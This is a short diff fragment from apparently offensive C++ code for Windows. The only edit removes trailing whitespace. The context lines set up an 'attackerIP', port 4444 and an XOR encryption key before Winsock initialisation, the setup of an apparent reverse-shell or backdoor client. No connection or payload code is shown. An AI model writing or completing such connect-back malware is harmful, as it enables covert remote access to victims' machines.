@@ -21,7 +21,7 @@ std::string xorEncrypt(const std::string& data, const std::string& key) {
 
 int main() {
     std::string attackerIP = "192.168.1.1"; // replace with your iP address
-    int port = 4444; // replace with your port 
+    int port = 4444; // replace with your port
     std::string encryptionKey = "123456789"; // replace with XOR encryption key
 
     // initialize Winsock
